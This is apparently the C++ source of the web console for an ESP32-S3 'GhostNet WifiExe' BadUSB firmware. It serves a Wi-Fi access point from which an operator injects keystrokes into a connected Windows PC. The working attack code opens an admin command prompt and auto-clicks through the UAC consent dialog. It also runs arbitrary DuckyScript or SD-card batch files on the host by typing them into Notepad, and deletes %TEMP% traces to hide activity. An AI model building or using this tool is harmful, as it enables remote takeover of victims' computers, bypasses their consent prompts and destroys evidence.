#include "web_ui.h"
#include <WiFi.h>
#include <SD.h>
#include <FS.h>
#include "badusb.h"
#include "usb_msc_module.h"
#include "sd_module.h"
#include "USBHIDKeyboard.h"

WebUI webUI;

// ── HTML / CSS Cyber Theme ──────────────────────────────────
static const char CSS_STYLES[] PROGMEM = R"rawliteral(
* { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", monospace; }
body { background: #0b0f19; color: #e2e8f0; padding: 20px; line-height: 1.5; }
.container { max-width: 800px; margin: 0 auto; }
header { border-bottom: 2px solid #00e5ff; padding-bottom: 12px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
h1 { color: #00e5ff; font-size: 1.5rem; letter-spacing: 1px; text-transform: uppercase; }
.badge { background: #00e5ff22; color: #00e5ff; border: 1px solid #00e5ff66; padding: 4px 10px; border-radius: 4px; font-size: 0.75rem; font-weight: bold; }
.badge.warn { background: #ffaa0022; color: #ffaa00; border-color: #ffaa0066; }
.badge.ok { background: #00ff9d22; color: #00ff9d; border-color: #00ff9d66; }
.grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 12px; margin-bottom: 20px; }
.card { background: #131b2e; border: 1px solid #1e293b; border-radius: 8px; padding: 14px; }
.card-title { font-size: 0.75rem; color: #94a3b8; text-transform: uppercase; margin-bottom: 6px; }
.card-val { font-size: 1.1rem; color: #ffffff; font-weight: bold; }
.btn-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 12px; margin-bottom: 24px; }
.btn { display: inline-flex; align-items: center; justify-content: center; background: #1e293b; color: #ffffff; border: 1px solid #334155; padding: 12px 16px; border-radius: 6px; font-size: 0.9rem; font-weight: bold; text-decoration: none; cursor: pointer; transition: all 0.2s ease; text-align: center; }
.btn:hover { background: #00e5ff; color: #0b0f19; border-color: #00e5ff; box-shadow: 0 0 12px #00e5ff66; }
.btn-primary { background: #00e5ff; color: #0b0f19; border-color: #00e5ff; }
.btn-primary:hover { background: #00b4cc; color: #0b0f19; box-shadow: 0 0 16px #00e5ffaa; }
.btn-warn { border-color: #ffaa0066; color: #ffaa00; }
.btn-warn:hover { background: #ffaa00; color: #0b0f19; box-shadow: 0 0 12px #ffaa0066; }
.btn-danger { border-color: #ef444466; color: #ef4444; }
.btn-danger:hover { background: #ef4444; color: #ffffff; box-shadow: 0 0 12px #ef444466; }
.btn-sm { padding: 6px 12px; font-size: 0.8rem; }
.section { background: #131b2e; border: 1px solid #1e293b; border-radius: 8px; padding: 16px; margin-bottom: 20px; }
.section-title { font-size: 1rem; color: #00e5ff; margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center; }
.file-list { list-style: none; }
.file-item { display: flex; justify-content: space-between; align-items: center; padding: 10px 12px; border-bottom: 1px solid #1e293b; }
.file-item:last-child { border-bottom: none; }
.file-link { color: #38bdf8; text-decoration: none; font-family: monospace; font-size: 0.95rem; }
.file-link:hover { text-decoration: underline; color: #00e5ff; }
.folder-link { color: #facc15; text-decoration: none; font-family: monospace; font-weight: bold; font-size: 0.95rem; }
.folder-link:hover { text-decoration: underline; color: #fde047; }
.file-meta { font-size: 0.8rem; color: #64748b; font-family: monospace; margin-left: 10px; }
.file-actions { display: flex; gap: 8px; }
pre { background: #070a12; border: 1px solid #1e293b; padding: 14px; border-radius: 6px; font-family: "Courier New", Courier, monospace; font-size: 0.85rem; color: #a5f3fc; overflow-x: auto; max-height: 450px; white-space: pre-wrap; word-break: break-all; margin-bottom: 16px; }
textarea { width: 100%; height: 120px; background: #070a12; border: 1px solid #334155; border-radius: 6px; color: #e2e8f0; font-family: monospace; font-size: 0.9rem; padding: 10px; margin-bottom: 12px; resize: vertical; }
textarea:focus { outline: none; border-color: #00e5ff; box-shadow: 0 0 8px #00e5ff44; }
.breadcrumbs { font-family: monospace; font-size: 0.9rem; color: #94a3b8; margin-bottom: 16px; }
.breadcrumbs a { color: #00e5ff; text-decoration: none; }
.breadcrumbs a:hover { text-decoration: underline; }
.alert { background: #00e5ff11; border-left: 4px solid #00e5ff; padding: 10px 14px; border-radius: 4px; font-size: 0.85rem; margin-bottom: 16px; color: #bae6fd; }
footer { text-align: center; font-size: 0.75rem; color: #64748b; margin-top: 30px; }
)rawliteral";

WebUI::WebUI() : _initialized(false), _running(false), _server(WIFI_EXE_PORT), _statusMessage("") {}

bool WebUI::init() {
    Serial.println(F("[WebUI] Initializing WifiExe Engine..."));

    _server.on("/", HTTP_GET, [this]() { handleRoot(); });
    _server.on("/folder", HTTP_GET, [this]() { handleFolder(); });
    _server.on("/file", HTTP_GET, [this]() { handleFile(); });
    _server.on("/execute_file", HTTP_POST, [this]() { handleExecuteFile(); });
    _server.on("/execute_cmd", HTTP_POST, [this]() { handleExecuteCmd(); });
    _server.on("/mount_sd", HTTP_GET, [this]() { handleMountStorage(); });
    _server.on("/unmount_sd", HTTP_GET, [this]() { handleUnmountStorage(); });
    _server.on("/clear_trace", HTTP_GET, [this]() { handleClearTrace(); });
    _server.on("/run_sysinfo", HTTP_GET, [this]() { handleSysinfoPayload(); });
    _server.on("/restart", HTTP_GET, [this]() { handleRestart(); });

    _server.onNotFound([this]() {
        _server.send(404, "text/plain", "GhostNet WifiExe: 404 Not Found");
    });

    _initialized = true;
    return true;
}

void WebUI::start() {
    if (!_initialized) init();

    if (!_running) {
        Serial.printf("[WebUI] Starting SoftAP '%s'...\n", WIFI_EXE_SSID);
        WiFi.softAP(WIFI_EXE_SSID, WIFI_EXE_PASS, WIFI_EXE_CHANNEL, 0, WIFI_EXE_MAX_CONN);
        delay(100);

        _server.begin();
        _running = true;
        _statusMessage = "Server Active";
        Serial.printf("[WebUI] WifiExe running at http://%s/\n", WiFi.softAPIP().toString().c_str());
    }
}

void WebUI::stop() {
    if (_running) {
        _server.close();
        WiFi.softAPdisconnect(true);
        _running = false;
        _statusMessage = "Server Stopped";
        Serial.println(F("[WebUI] Web server stopped"));
    }
}

void WebUI::update() {
    if (_running) {
        _server.handleClient();
    }
}

bool WebUI::isRunning() const {
    return _running;
}

int WebUI::getClientCount() const {
    if (!_running) return 0;
    return WiFi.softAPgetStationNum();
}

String WebUI::getIP() const {
    if (_running) {
        return WiFi.softAPIP().toString();
    }
    return WiFi.localIP().toString();
}

const char* WebUI::getSSID() const {
    return WIFI_EXE_SSID;
}

// ── String Helpers ──────────────────────────────────────────
String WebUI::urlEncode(const String &input) {
    String encoded = "";
    char bufHex[4];
    for (size_t i = 0; i < input.length(); i++) {
        char c = input.charAt(i);
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~' || c == '/') {
            encoded += c;
        } else {
            sprintf(bufHex, "%%%02X", (unsigned char)c);
            encoded += bufHex;
        }
    }
    return encoded;
}

String WebUI::urlDecode(const String &input) {
    String decoded = "";
    for (size_t i = 0; i < input.length(); i++) {
        if (input.charAt(i) == '%' && i + 2 < input.length()) {
            int j;
            sscanf(input.substring(i + 1, i + 3).c_str(), "%x", &j);
            decoded += static_cast<char>(j);
            i += 2;
        } else if (input.charAt(i) == '+') {
            decoded += ' ';
        } else {
            decoded += input.charAt(i);
        }
    }
    return decoded;
}

String WebUI::htmlEscape(const String &input) {
    String escaped = input;
    escaped.replace("&", "&amp;");
    escaped.replace("<", "&lt;");
    escaped.replace(">", "&gt;");
    escaped.replace("\"", "&quot;");
    escaped.replace("'", "&#39;");
    return escaped;
}

void WebUI::sendHtmlResponse(int code, const String& content) {
    String page = F("<!DOCTYPE html><html><head><meta charset='utf-8'>");
    page += F("<meta name='viewport' content='width=device-width,initial-scale=1'>");
    page += F("<title>GhostNet // WifiExe Console</title><style>");
    page += FPSTR(CSS_STYLES);
    page += F("</style></head><body><div class='container'>");
    page += content;
    page += F("<footer>GhostNet v2.0 &bull; WifiExe BadUSB Suite &bull; ESP32-S3 Native OTG</footer>");
    page += F("</div></body></html>");
    _server.send(code, "text/html", page);
}

// ── Remote BadUSB Execution Engine (WifiExe / ExeScript) ─────
void WebUI::openElevatedCmd() {
    badUsb.init();
    // Windows + R
    badUsb.pressModifierCombo(KEY_LEFT_GUI, 'r');
    delay(700);

    // Launch cmd as Admin via PowerShell
    badUsb.typeString("powershell -Command \"Start-Process cmd.exe -Verb RunAs\"");
    delay(100);
    badUsb.pressKey(KEY_RETURN);
    delay(1500);

    // Handle Windows UAC prompt (Left arrow + Enter selects 'Yes')
    badUsb.pressKey(KEY_LEFT_ARROW);
    delay(300);
    badUsb.pressKey(KEY_RETURN);
    delay(1200);
}

void WebUI::clearTrace() {
    openElevatedCmd();
    delay(300);
    badUsb.typeString("powershell -Command \"Remove-Item -Path '$env:TEMP\\temp*' -Recurse -Force -ErrorAction SilentlyContinue\"\n");
    delay(1000);
    badUsb.typeString("exit\n");
    _statusMessage = "Traces cleared in %TEMP%";
}

void WebUI::runSysinfoPayload() {
    openElevatedCmd();
    delay(500);
    // Safe educational diagnostic script: inspect system info and network config
    badUsb.typeString("cmd.exe /k \"color 0A && title GhostNet System Audit && echo === GhostNet System Audit === && hostname && whoami && systeminfo | findstr /B /C:\"OS Name\" /C:\"System Model\" && ipconfig | findstr /C:\"IPv4\" && echo Audit complete.\"\n");
    _statusMessage = "SysInfo Audit executed on host";
}

void WebUI::executeScript(const String& scriptText, int delayMs) {
    badUsb.init();
    int start = 0;
    int len = scriptText.length();

    while (start < len) {
        int end = scriptText.indexOf('\n', start);
        if (end == -1) end = len;
        String line = scriptText.substring(start, end);
        line.trim();

        if (line.length() > 0) {
            badUsb.parseLine(line.c_str());
            delay(delayMs);
        }
        start = end + 1;
    }
}

void WebUI::executeFile(const String& filePath) {
    if (!sdModule.isAvailable()) {
        _statusMessage = "Error: SD Card not available";
        return;
    }

    File f = SD.open(filePath, FILE_READ);
    if (!f) {
        _statusMessage = "Error: Cannot open " + filePath;
        return;
    }

    badUsb.init();

    // If file is a .txt or .dd DuckyScript, run via Ducky parser
    if (filePath.endsWith(".txt") || filePath.endsWith(".dd") || filePath.endsWith(".TXT")) {
        while (f.available()) {
            String line = f.readStringUntil('\n');
            line.trim();
            if (line.length() > 0) {
                badUsb.parseLine(line.c_str());
                delay(20);
            }
        }
    } else {
        // Run as batch script via elevated CMD using Notepad/temp runner (WifiExe method)
        openElevatedCmd();
        delay(600);
        badUsb.typeString("cd /d %TEMP% && mkdir temp 2>nul && cd temp && rem/ > temp.bat && notepad temp.bat\n");
        delay(1500);

        while (f.available()) {
            String line = f.readStringUntil('\n');
            badUsb.typeString(line.c_str());
            badUsb.pressKey(KEY_RETURN);
            delay(15);
        }
        delay(800);
        // Save Notepad (Ctrl+S) and exit (Alt+F4)
        badUsb.pressModifierCombo(KEY_LEFT_CTRL, 's');
        delay(400);
        badUsb.pressModifierCombo(KEY_LEFT_ALT, KEY_F4);
        delay(800);
        // Execute temp.bat in cmd
        badUsb.typeString("cls && temp.bat\n");
    }

    f.close();
    _statusMessage = "Executed: " + filePath;
}

// ── HTTP Request Handlers ───────────────────────────────────
void WebUI::handleRoot() {
    String html = F("<header><h1>GhostNet // WifiExe</h1>");
    html += F("<span class='badge ok'>ONLINE</span></header>");

    if (_statusMessage.length() > 0) {
        html += "<div class='alert'>" + htmlEscape(_statusMessage) + "</div>";
    }

    // System Metrics Grid
    html += F("<div class='grid'>");
    html += F("<div class='card'><div class='card-title'>ESP32-S3 IP</div><div class='card-val'>");
    html += getIP();
    html += F("</div></div>");

    html += F("<div class='card'><div class='card-title'>Connected Clients</div><div class='card-val'>");
    html += String(getClientCount());
    html += F("</div></div>");

    html += F("<div class='card'><div class='card-title'>SD Card</div><div class='card-val'>");
    if (sdModule.isAvailable()) {
        html += String(sdModule.getCardSizeMB()) + " MB";
    } else {
        html += F("<span style='color:#ef4444;'>No Card</span>");
    }
    html += F("</div></div>");

    html += F("<div class='card'><div class='card-title'>USB State</div><div class='card-val'>");
    if (mscModule.isMounted()) {
        html += F("<span style='color:#ffaa00;'>Mass Storage</span>");
    } else {
        html += F("<span style='color:#00ff9d;'>HID Ready</span>");
    }
    html += F("</div></div></div>");

    // Primary Action Buttons
    html += F("<div class='btn-grid'>");
    html += F("<a class='btn btn-primary' href='/folder?path=/'>📂 Browse SD Card Files</a>");
    if (mscModule.isMounted()) {
        html += F("<a class='btn btn-warn' href='/unmount_sd'>⏏ Unmount USB Drive</a>");
    } else {
        html += F("<a class='btn' href='/mount_sd'>💾 Mount SD as USB Drive</a>");
    }
    html += F("<a class='btn' href='/run_sysinfo'>⚡ Run Host SysInfo Audit</a>");
    html += F("<a class='btn btn-warn' href='/clear_trace'>🧹 Clear %TEMP% Traces</a>");
    html += F("<a class='btn btn-danger' href='/restart'>🔄 Reset USB Subsystem</a>");
    html += F("</div>");

    // Quick Command Injection Console
    html += F("<div class='section'>");
    html += F("<div class='section-title'><span>⌨️ Direct BadUSB Console</span><span class='badge'>HID Injection</span></div>");
    html += F("<p style='font-size:0.85rem;color:#94a3b8;margin-bottom:10px;'>Type DuckyScript (e.g. <code>GUI r</code>, <code>DELAY 500</code>, <code>STRING notepad</code>, <code>ENTER</code>) or raw commands to execute on the connected target PC:</p>");
    html += F("<form method='POST' action='/execute_cmd'>");
    html += F("<textarea name='script' placeholder='GUI r\nDELAY 500\nSTRING cmd.exe\nENTER\nDELAY 500\nSTRING echo Hello from GhostNet WifiExe!\nENTER'></textarea>");
    html += F("<div style='display:flex;justify-content:flex-end;'><button type='submit' class='btn btn-primary btn-sm'>Execute on Host</button></div>");
    html += F("</form></div>");

    sendHtmlResponse(200, html);
}

void WebUI::handleFolder() {
    String folderPath = _server.arg("path");
    if (folderPath.length() == 0) folderPath = "/";
    folderPath = urlDecode(folderPath);

    if (!sdModule.isAvailable()) {
        sendHtmlResponse(200, F("<div class='alert'>SD Card not available!</div><a class='btn' href='/'>Back to Dashboard</a>"));
        return;
    }

    File dir = SD.open(folderPath);
    if (!dir || !dir.isDirectory()) {
        sendHtmlResponse(404, F("<div class='alert'>Directory not found!</div><a class='btn' href='/'>Back to Dashboard</a>"));
        return;
    }

    String html = F("<header><h1>SD Card Explorer</h1><a class='btn btn-sm' href='/'>Dashboard</a></header>");

    // Breadcrumbs
    html += "<div class='breadcrumbs'>Location: <a href='/folder?path=/'>/ (root)</a>";
    String accum = "";
    int start = 0;
    while (start < folderPath.length()) {
        int next = folderPath.indexOf('/', start + 1);
        if (next == -1) next = folderPath.length();
        String part = folderPath.substring(start + 1, next);
        if (part.length() > 0) {
            accum += "/" + part;
            html += " / <a href='/folder?path=" + urlEncode(accum) + "'>" + htmlEscape(part) + "</a>";
        }
        start = next;
    }
    html += "</div>";

    html += F("<div class='section'><ul class='file-list'>");

    // Parent directory link if not in root
    if (folderPath != "/") {
        int lastSlash = folderPath.lastIndexOf('/');
        String parentPath = (lastSlash <= 0) ? "/" : folderPath.substring(0, lastSlash);
        html += "<li class='file-item'><a class='folder-link' href='/folder?path=" + urlEncode(parentPath) + "'>📁 .. (Parent Directory)</a></li>";
    }

    File entry = dir.openNextFile();
    int count = 0;
    while (entry) {
        String name = entry.name();
        // Skip leading slash if any
        if (name.startsWith("/")) name = name.substring(1);

        String fullPath = (folderPath == "/") ? ("/" + name) : (folderPath + "/" + name);

        html += "<li class='file-item'>";
        if (entry.isDirectory()) {
            html += "<div><a class='folder-link' href='/folder?path=" + urlEncode(fullPath) + "'>📁 " + htmlEscape(name) + "/</a></div>";
        } else {
            html += "<div><a class='file-link' href='/file?path=" + urlEncode(fullPath) + "'>📄 " + htmlEscape(name) + "</a>";
            html += "<span class='file-meta'>(" + String(entry.size()) + " B)</span></div>";
            html += "<div class='file-actions'>";
            html += "<a class='btn btn-sm btn-primary' href='/file?path=" + urlEncode(fullPath) + "'>View / Run</a>";
            html += "</div>";
        }
        html += "</li>";
        entry.close();
        entry = dir.openNextFile();
        count++;
    }
    dir.close();

    if (count == 0) {
        html += F("<li class='file-item' style='color:#64748b;'>Directory is empty</li>");
    }

    html += F("</ul></div>");
    sendHtmlResponse(200, html);
}

void WebUI::handleFile() {
    String filePath = _server.arg("path");
    filePath = urlDecode(filePath);

    if (!sdModule.isAvailable()) {
        sendHtmlResponse(200, F("<div class='alert'>SD Card not available!</div><a class='btn' href='/'>Back to Dashboard</a>"));
        return;
    }

    File f = SD.open(filePath, FILE_READ);
    if (!f || f.isDirectory()) {
        sendHtmlResponse(404, F("<div class='alert'>File not found!</div><a class='btn' href='/folder?path=/'>Back to Explorer</a>"));
        return;
    }

    _activeFilePath = filePath;
    _activeFileContent = "";
    // Read up to 8KB for preview to avoid memory exhaustion
    size_t bytesRead = 0;
    while (f.available() && bytesRead < 8192) {
        _activeFileContent += (char)f.read();
        bytesRead++;
    }
    f.close();

    String html = "<header><h1>File: " + htmlEscape(filePath) + "</h1>";
    html += "<a class='btn btn-sm' href='/folder?path=/'>Explorer</a></header>";

    html += F("<div class='section'>");
    html += "<div class='section-title'><span>File Preview</span><span class='file-meta'>" + String(bytesRead) + " bytes</span></div>";
    html += "<pre>" + htmlEscape(_activeFileContent) + "</pre>";

    html += F("<form method='POST' action='/execute_file' style='display:flex;gap:12px;'>");
    html += "<input type='hidden' name='path' value='" + htmlEscape(filePath) + "'>";
    html += F("<button type='submit' class='btn btn-primary'>⚡ Execute via BadUSB</button>");
    html += F("<a class='btn' href='/'>Back to Dashboard</a>");
    html += F("</form></div>");

    sendHtmlResponse(200, html);
}

void WebUI::handleExecuteFile() {
    String path = _server.arg("path");
    if (path.length() == 0) path = _activeFilePath;
    path = urlDecode(path);

    executeFile(path);

    _server.sendHeader("Location", "/file?path=" + urlEncode(path), true);
    _server.send(302, "text/plain", "");
}

void WebUI::handleExecuteCmd() {
    String script = _server.arg("script");
    if (script.length() > 0) {
        executeScript(script, 15);
        _statusMessage = "Custom BadUSB command executed successfully";
    }

    _server.sendHeader("Location", "/", true);
    _server.send(302, "text/plain", "");
}

void WebUI::handleMountStorage() {
    badUsb.releaseAll();
    mscModule.mountSD();
    _statusMessage = "SD Card mounted as USB Drive on host PC";

    _server.sendHeader("Location", "/", true);
    _server.send(302, "text/plain", "");
}

void WebUI::handleUnmountStorage() {
    mscModule.unmountSD();
    badUsb.init();
    _statusMessage = "USB Drive unmounted. HID Keyboard restored.";

    _server.sendHeader("Location", "/", true);
    _server.send(302, "text/plain", "");
}

void WebUI::handleClearTrace() {
    clearTrace();
    _server.sendHeader("Location", "/", true);
    _server.send(302, "text/plain", "");
}

void WebUI::handleSysinfoPayload() {
    runSysinfoPayload();
    _server.sendHeader("Location", "/", true);
    _server.send(302, "text/plain", "");
}

void WebUI::handleRestart() {
    badUsb.releaseAll();
    mscModule.unmountSD();
    _statusMessage = "USB subsystem reset";

    _server.sendHeader("Location", "/", true);
    _server.send(302, "text/plain", "");
}
